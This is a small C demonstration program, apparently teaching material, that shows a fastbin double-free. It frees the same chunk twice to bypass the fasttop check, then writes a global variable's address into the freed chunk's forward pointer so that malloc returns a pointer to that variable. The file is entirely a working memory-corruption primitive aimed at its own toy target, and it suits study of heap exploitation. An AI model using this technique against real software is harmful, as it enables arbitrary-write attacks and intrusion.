//double-free-ptr1.c
#include <stdio.h>
#include <stdlib.h>

int target;

void main()
{
    int i;
    void *a, *b;
    
    printf("&target=%p\n", &target);
    
    a = malloc(16);
    b = malloc(16);
      
    free(a);
    free(b); //bypass fasttop
    free(a); //double free
    
    void *c = malloc(16); // returns a
    
    malloc(16);  // returns b
    
    // Write address of target in fwd pointer
    *(int*)a = (int)&target;
    
    malloc(16); // returns a again
    
    printf("Trying to return a pointer to target\n");
    printf("malloc(16)=%p\n", malloc(16));
}